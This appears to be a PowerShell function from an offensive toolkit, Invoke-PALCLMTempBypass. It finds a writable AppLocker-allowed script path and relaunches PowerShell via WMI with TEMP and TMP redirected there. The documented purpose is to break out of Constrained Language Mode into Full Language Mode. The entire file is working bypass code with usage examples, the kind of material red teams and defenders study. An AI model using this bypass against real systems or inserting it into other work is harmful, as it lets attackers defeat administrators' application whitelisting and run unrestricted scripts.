#Requires -Modules CimCmdlets
Function Invoke-PALCLMTempBypass
{
<#
.SYNOPSIS

The function figures out allowed Script paths, injects that path to the temp and tmp variable in a new Powershell console.
This results in a Full Language Mode Powershell console.

Author: @oddvarmoe
License: BSD 3-Clause
Required Dependencies: Get-PALWriteableAllowedPaths
Optional Dependencies: None

.DESCRIPTION

Calling function without parameters will make it get all the AppLocker rules for 
the scripts rule section and figure out if there is a writable path for the user. 
The script will then pick a random writable path and spawn a new Powershell window
pointing %temp% and %tmp% to that location. 

If you specify $AllowedPath it will not enumerate the rules and figure out writable
locations. Instead it will try to spawn Powershell with the %temp% and %tmp% pointing to
that location.

Use $ExecutionContext.SessionState.LanguageMode to check language mode

.PARAMETER AllowedPath

Instead of enumerating you can supply a path to a location where you know that execution of scripts is allowed and the user has write access to. 

.PARAMETER PoshStartParms

Specify if you want to add parameters to the powershell.exe that will be spawned. 
You need to start with a space. Ex -PoshStartParms " -file c:\temp\file.ps1"

.EXAMPLE

Spawns a new Powershell window if it figures out a valid path

PS C:\> Invoke-PALCLMTempBypass

[*] Finding suitable script rule location

[*] Starting full language mode Powershell

ProcessId ReturnValue PSComputerName
--------- ----------- --------------
     4000           0               

.EXAMPLE

PS C:\> Invoke-PALCLMTempBypass -AllowedPath C:\windows\Tasks\

[*] Path specified - Trying bypass from that path

[*] Starting full language mode Powershell

ProcessId ReturnValue PSComputerName
--------- ----------- --------------
     6092           0
#>

# Function Version: 1.0

[CmdletBinding()] Param (
        [String]
        $AllowedPath,

        [String]
        $PoshStartParms
    )
    Process
    {
        Try
        {
            $InjectiblePaths = @()

            if($AllowedPath)
            {
                "`n[*] Path specified - Trying bypass from that path"
                $InjectiblePaths += $AllowedPath
            }
            else
            {
                "`n[*] Finding suitable script rule location - Be patient - Takes time the first time you run it per session, since it calculates all writable paths!"
                #A bug... Needs to run it once before I can use rulesection and get the correct count
                #must be something related to global variables
                Get-PALWriteableAllowedPaths | Out-Null
                $InjectiblePaths += Get-PALWriteableAllowedPaths -RuleSection Script
            }

            if($InjectiblePaths)
            {
                $RandomScriptAllowedPath = $InjectiblePaths[(Get-Random -Minimum 0 -Maximum $InjectiblePaths.Count)]
                "`[*] Found $($InjectiblePaths.count) paths"
                "`[*] Random path picked: $($RandomScriptAllowedPath.Path)"
                "`[*] Launching Powershell with TEMP/TMP set to: $($RandomScriptAllowedPath.Path)"
                $TEMPBypassPath = $RandomScriptAllowedPath
                $TMPBypassPath = $RandomScriptAllowedPath
                
                #Borrowed code from Matt Graeber (Thanks! You rock! #KeepMattHappy)
                #https://gist.githubusercontent.com/mattifestation/9d09822e94fc901559280d700101f14e/raw/0128bf47f1f761a9fd254d1bf268579ff2a15685/RunscripthelperBypass.ps1 
                $CMDLine = "$PSHOME\powershell.exe"
                
                If($PoshStartParms){
                    $CMDLine += $PoshStartParms
                }

                [String[]] $EnvVarsExceptTemp = Get-ChildItem Env:\* -Exclude "TEMP","TMP"| % { "$($_.Name)=$($_.Value)" }
                $TEMPBypassPath = "Temp=$($RandomScriptAllowedPath.Path)"
                $TMPBypassPath = "TMP=$($RandomScriptAllowedPath.Path)"
                $EnvVarsExceptTemp += $TEMPBypassPath
                $EnvVarsExceptTemp += $TMPBypassPath
                
                $StartParamProperties = @{ EnvironmentVariables = $EnvVarsExceptTemp }
                $StartParams = New-CimInstance -ClassName Win32_ProcessStartup -ClientOnly -Property $StartParamProperties

                "`n[*] Starting full language mode Powershell"
                Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{
                    CommandLine = $CMDLine
                    ProcessStartupInformation = $StartParams
                }
            }
            else
            {
                Write-Verbose "No path found, bypass not possible :-("
            }
        }
        Catch
        {
            write-error $_
        }
        Finally{}
    }
}